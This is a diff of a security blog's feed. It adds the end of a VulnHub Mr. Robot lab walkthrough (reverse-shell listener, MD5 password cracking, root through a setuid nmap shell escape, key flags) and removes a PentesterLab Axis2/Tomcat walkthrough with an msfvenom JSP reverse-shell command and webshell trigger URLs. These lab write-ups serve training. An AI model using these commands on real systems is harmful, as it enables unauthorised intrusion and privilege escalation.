+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.137<span class="o">]</span> 47762
+</span><span class='line'>Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span><span class='line'> 09:01:50 up <span class="m">15</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.05
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'>/
+</span><span class='line'><span class="nv">$ </span>ls -al
+</span><span class='line'>total 84
+</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> .
+</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> bin
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> boot
+</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root root  <span class="m">3960</span> Aug  <span class="m">7</span>  <span class="m">2016</span> dev
+</span><span class='line'>drwxr-xr-x  <span class="m">77</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span>  <span class="m">2016</span> etc
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> home
+</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">33</span> Jun <span class="m">24</span>  <span class="m">2015</span> initrd.img -&gt; boot/initrd.img-3.13.0-55-generic
+</span><span class='line'>drwxr-xr-x  <span class="m">16</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib64
+</span><span class='line'>drwx------   <span class="m">2</span> root root <span class="m">16384</span> Jun <span class="m">24</span>  <span class="m">2015</span> lost+found
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> media
+</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> mnt
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> opt
+</span><span class='line'>dr-xr-xr-x <span class="m">339</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> proc
+</span><span class='line'>drwx------   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> root
+</span><span class='line'>drwxr-xr-x  <span class="m">14</span> root root   <span class="m">500</span> Aug  <span class="m">7</span> 08:47 run
+</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> sbin
+</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> srv
+</span><span class='line'>dr-xr-xr-x  <span class="m">13</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> sys
+</span><span class='line'>drwxrwxrwt   <span class="m">5</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span> 08:49 tmp
+</span><span class='line'>drwxr-xr-x  <span class="m">10</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> usr
+</span><span class='line'>drwxr-xr-x  <span class="m">11</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> var
+</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">30</span> Jun <span class="m">24</span>  <span class="m">2015</span> vmlinuz -&gt; boot/vmlinuz-3.13.0-55-generic
+</span><span class='line'><span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then use python to get a better shell.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</span>
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/home/robot
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 16
+</span><span class='line'>drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
+</span><span class='line'>drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
+</span><span class='line'>-r-------- <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat password.raw-md5
+</span><span class='line'>cat password.raw-md5
+</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b
+</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep robot
+</span><span class='line'>cat /etc/passwd <span class="p">|</span> grep robot
+</span><span class='line'>robot:x:1002:1002::/home/robot:
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Found the 2nd key file <code>key-2-of-3.txt</code>, but it only can be read by user <code>robot</code></p>
+
+<p>However, I found the username <code>robot</code> and the MD5 hash value of his password <code>c3fcd3d76192e4007dfb496cca67e13b</code> in the file <code>/home/robot/password.raw-md5</code></p>
+
+<p>By cracking the MD5 hash, I got <code>robot</code>&rsquo;s password is <font color="red"><code>abcdefghijklmnopqrstuvwxyz</code></font></p>
+
+<p>Also, by checking the <code>/etc/passwd</code> file, I noticed that <code>robot</code> is a system user.</p>
+
+<p>Now I can <code>su</code> to user <code>robot</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>su robot
+</span><span class='line'>su robot
+</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz
+</span><span class='line'>
+</span><span class='line'>robot@linux:~<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, I can read the 2nd key:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:~<span class="nv">$ </span>cat key-2-of-3.txt
+</span><span class='line'>cat key-2-of-3.txt
+</span><span class='line'>822c73956184f694993bede3eb39f959
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The 2nd key is <font color="red"><code>822c73956184f694993bede3eb39f959</code></font></p>
+
+<p>Now move on to enumeration and rooting, I found there is an <a href="https://www.exploit-db.com/papers/18168/" title="NMAP --interactive priviledge escalation">old version of NMAP vulnerability</a> which can be exploited to get ROOT:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap -v
+</span><span class='line'>/usr/local/bin/nmap -v
+</span><span class='line'>
+</span><span class='line'>Starting nmap 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span> at 2016-08-07 12:40 UTC
+</span><span class='line'>No target machines/networks specified!
+</span><span class='line'>QUITTING!
+</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>ls -la /usr/local/bin/nmap
+</span><span class='line'>ls -la /usr/local/bin/nmap
+</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">504736</span> Nov <span class="m">13</span>  <span class="m">2015</span> /usr/local/bin/nmap
+</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap --interactive
+</span><span class='line'>/usr/local/bin/nmap --interactive
+</span><span class='line'>
+</span><span class='line'>Starting nmap V. 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
+</span><span class='line'>Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
+</span><span class='line'>nmap&gt; !sh
+</span><span class='line'>!sh
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>robot<span class="o">)</span>
+</span><span class='line'><span class="c"># pwd</span>
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/tmp
+</span><span class='line'><span class="c"># cd /root</span>
+</span><span class='line'><span class="nb">cd</span> /root
+</span><span class='line'><span class="c"># pwd</span>
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/root
+</span><span class='line'><span class="c"># ls -al</span>
+</span><span class='line'>ls -al
+</span><span class='line'>total 32
+</span><span class='line'>drwx------  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
+</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
+</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">4058</span> Nov <span class="m">14</span>  <span class="m">2015</span> .bash_history
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root <span class="m">3274</span> Sep <span class="m">16</span>  <span class="m">2015</span> .bashrc
+</span><span class='line'>drwx------  <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .cache
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root    <span class="m">0</span> Nov <span class="m">13</span>  <span class="m">2015</span> firstboot_done
+</span><span class='line'>-r--------  <span class="m">1</span> root root   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-3-of-3.txt
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Feb <span class="m">20</span>  <span class="m">2014</span> .profile
+</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">1024</span> Sep <span class="m">16</span>  <span class="m">2015</span> .rnd
+</span><span class='line'><span class="c"># cat key-3-of-3.txt</span>
+</span><span class='line'>cat key-3-of-3.txt
+</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4
+</span><span class='line'><span class="c"># </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we got ROOT and the 3rd key is <font color="red"><code>04787ddef27c3dee1ee161b21670b4e4</code></font></p>
+
+<!--- Reference -->
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[VulnHub] SecTalks: BNE0x03 - Simple]]></title>
@@ -13414,92 +14207,6 @@ Then it introduces the basics of post exploitation: shell, reverse-shell and TCP
 <li><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">Bypass file upload validation</a></li>
 </ol>
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[PentesterLab] Axis2 Web service and Tomcat Manager]]></title>
-    <link href="http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/"/>
-    <updated>2015-05-30T08:16:43-04:00</updated>
-    <id>http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager</id>
-    <content type="html"><![CDATA[<p>&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server.&rdquo; &ndash; <a href="https://www.pentesterlab.com/">PentesterLab</a></p>
-
-<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/course">course</a> is highly recommanded to read.</p>
-
-<p>Difficulty: 3 / 5</p>
-
-<!-- more -->
-
-
-<h2>Walkthrough</h2>
-
-<p>Based on the result of NMAP scan, tcp port 80 is open.</p>
-
-<p>Access tcp port 80 and use DirBuster/wfuzz to brute force hidden path and found &ldquo;/axis2&rdquo;:</p>
-
-<p>wfuzz command to burte force hidden path:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://10.10.10.129/FUZZ 2>/dev/null</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/1.png"></p>
-
-<p>Due to axis2&rsquo;s ProxyService has information retrieving vulnerability, exploit it and find users' passwords information.</p>
-
-<p>Here are two methods to upload webshell.</p>
-
-<h3>Method 1</h3>
-
-<p>Retrieving Tomcat manager configuration to get login credentials.</p>
-
-<p>In Debian Linux, the tomcat configuration file <code>tomcat-users.xml</code> has default location: <font color="red"><em>/etc/tomcat6/tomcat-users.xml</em></font></p>
-
-<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/2.png"></p>
-
-<p>From <code>tomcat-users.xml</code> file, the tomcat manager-gui login password can be found: <font color="red"><em>manager / !mp0ss!bl32gu355</em></font></p>
-
-<p>Then login tomcat manager from the URL <code>http://10.10.10.129/manager/html</code> to upload and deploy JSP webshell in WAR file.</p>
-
-<p>Use msfvenom to generate JSP reverse shell and build the war file using <code>jar</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
-</span><span class='line'>$ cd webshell
-</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.131 LPORT=4444 -f raw > sh4.jsp
-</span><span class='line'>$ jar -cvf ../webshell.jar *</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Use the following URL to trigger reverse shell connect back to my Kali on port 4444:</p>
-
-<p><code>http://10.10.10.129/webshell/sh4.jsp</code></p>
-
-<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/3.png"></p>
-
-<h3>Method 2</h3>
-
-<p>Retrieving Axis2 configuration to get login credentials.</p>
-
-<p>In Debian Linux, the axis2 configuration file <code>axis2.xml</code> has default location: <font color="red"><em>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</em></font></p>
-
-<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/4.png"></p>
-
-<p>From <code>axis2.xml</code> file, the axis2 admin login password can be found: <font color="red">admin / axis2</font></p>
-
-<p>Then login axis2 admin page from the URL <code>http://10.10.10.129/axis2/axis2-admin/</code> to upload and deploy axis2 webshell in AAR file.</p>
-
-<p>Here I use <code>Cat.aar</code> <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">axis2 webshell</a>, upload and deploy it as axis2 service.</p>
-
-<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/5.png"></p>
-
-<p>Then use the following URL to trigger reverse shell connect back to my Kali on port 5555:</p>
-
-<p><code>http://10.10.10.129/axis2/services/Cat/shell?host=10.10.10.131&amp;port=5555</code></p>
-
-<p><img src="http://f4l13n5n0w.github.io/downloads/Axis2_Web_Tomcat/6.png"></p>
 ]]></content>
   </entry>
   
